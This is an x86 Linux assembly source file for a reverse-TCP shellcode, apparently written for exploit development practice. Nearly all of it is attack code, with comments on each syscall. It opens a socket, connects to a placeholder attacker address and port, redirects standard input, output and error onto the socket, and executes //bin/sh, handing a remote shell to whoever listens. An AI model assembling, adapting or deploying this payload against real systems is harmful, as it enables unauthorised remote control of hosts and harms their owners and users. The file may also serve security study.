global _start

section .text
_start:

  ; socket(AF_INET, SOCK_STREAM, 0)
  ; (EAX) socketcall=102
  ; (EBX) SYS_SOCKET=1
  ; (ECX) points to arguments on stack in reverse order: (0,1,2)
  xor ebx, ebx
  ; edx:eax = eax*ebx
  mul ebx
  mov al, 0x66
  push ebx
  inc ebx
  push ebx
  push 0x02
  mov ecx, esp
  int 0x80
  ; (EAX) return value (file descriptor)
  xchg edx, eax

  ; connect(sock, (struct sockaddr *) &srv, sizeof(srv));
  ; (EAX) socketcall=102
  ; (EBX) SYS_CONNECT=3
  ; (ECX) points to arguments on stack in reverse order:
  ; (16, ptr {s_addr,sin_port,sin_family=2}, EDX)
  push DWORD IPADDR
  push WORD PORT
  inc ebx
  ; sin_family=2 (WORD)
  push bx
  mov ecx, esp
  ; sizeof(srv) = 16
  push BYTE 0x10
  ; pointer to srv
  push ecx
  ; sock fd (EDX)
  push edx
  mov ecx, esp
  inc ebx
  mov al, 0x66
  int 0x80
  ; (EAX) return value (0 - success, -1 - error)

  ; dup2(oldfd, newfd)
  ; (EAX) dup2=63
  ; (EBX) socket file descriptor number (EDX)
  ; (ECX) file descriptor for STDIN (0), STDOUT (1), STDERR (2)
  mov ebx, edx
  xor ecx, ecx
  mov cl, 0x03

loopdup:

  dec cl
  mov al, 0x3f
  int 0x80
  ; (EAX) return value (file descriptor on success, -1 in case of error)
  jnz loopdup

  ; execve(const char *filename, 0, 0)
  ; (EAX) execve=11
  ; (EBX) points to "//bin/sh",NULL
  ; (ECX) points to 0 (argv[0])
  ; (EDX) points to 0 (envp)
  push ecx
  mov edx, esp
  mov ecx, esp
  ; '//bin/sh'[::-1].encode('hex')
  ; >>> '68732f6e69622f2f'
  push 0x68732f6e
  push 0x69622f2f
  mov ebx, esp

  mov al, 0x0b
  int 0x80

; vim: set ft=nasm:
